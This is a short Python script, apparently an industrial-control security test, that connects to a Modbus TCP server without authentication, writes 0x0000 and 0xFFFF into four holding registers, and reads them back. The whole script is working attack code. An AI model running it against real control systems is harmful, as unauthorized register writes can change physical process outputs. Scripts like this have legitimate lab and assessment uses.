from pymodbus.client import ModbusTcpClient
import time
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

class ModbusUnauthorizedHoldingRegisterWriter:
    def __init__(self, host='localhost', port=502):
        self.host = host
        self.port = port
        self.client = None

    def connect(self):
        """Establish connection to Modbus server"""
        try:
            self.client = ModbusTcpClient(self.host, port=self.port)
            if self.client.connect():
                logger.info(f"Connected to target Modbus server at {self.host}:{self.port}")
                return True
            return False
        except Exception as e:
            logger.error(f"Connection failed: {e}")
            return False

    def write_holding_registers(self, start_addr=0):
        """Write holding registers: First 2 = 0x0000, Last 2 = 0xFFFF"""
        values = [0x0000] * 2 + [0xFFFF] * 2
        try:
            result = self.client.write_registers(start_addr, values)
            if not result.isError():
                logger.info("Successfully wrote holding register values.")
            else:
                logger.error("Failed to write holding register values.")
        except Exception as e:
            logger.error(f"Error writing holding registers: {e}")

    def read_holding_registers(self, start_addr=0, count=4):
        """Read holding registers (analog outputs)"""
        try:
            result = self.client.read_holding_registers(address=start_addr, count=count)
            if not result.isError():
                logger.info("Holding Register Values:")
                for i, value in enumerate(result.registers):
                    logger.info("  Register {}: {} (0x{:04X})".format(start_addr + i, value, value))
            return result.registers
        except Exception as e:
            logger.error(f"Failed to read holding registers: {e}")
            return None

    def run_test(self):
        """Write values to holding registers, then read them back."""
        if self.connect():
            logger.info("\nWriting values to Modbus server...")
            self.write_holding_registers()
            
            time.sleep(0.5)  # Small delay before reading
            
            logger.info("\nReading values back...")
            self.read_holding_registers()
            
            self.client.close()
        else:
            logger.error("Failed to connect to Modbus server")

if __name__ == "__main__":
    writer = ModbusUnauthorizedHoldingRegisterWriter()
    writer.run_test()
